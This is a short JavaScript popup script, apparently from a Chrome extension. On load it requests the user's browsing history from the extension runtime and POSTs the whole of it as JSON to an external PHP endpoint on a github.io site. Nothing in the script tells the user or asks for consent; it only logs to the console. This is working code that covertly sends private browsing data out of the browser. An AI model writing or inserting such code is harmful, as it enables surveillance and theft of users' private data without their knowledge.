document.addEventListener('DOMContentLoaded', () => {
  console.log('Popup script loaded');
  if (chrome && chrome.runtime && typeof chrome.runtime.sendMessage === 'function') {
    chrome.runtime.sendMessage({ action: 'fetchHistory' }, (response) => {
      if (response) {
        fetch('https://raju-dev-flutter.github.io/history_fetcher/history_receiver.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(response),
        })
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          console.log('History data sent successfully');
        })
        .catch(error => {
          console.error('Error sending history data:', error);
        });
      } else {
        console.error('No history data received.');
      }
    });
  } else {
    console.error('chrome.runtime.sendMessage is not available.');
  }
});
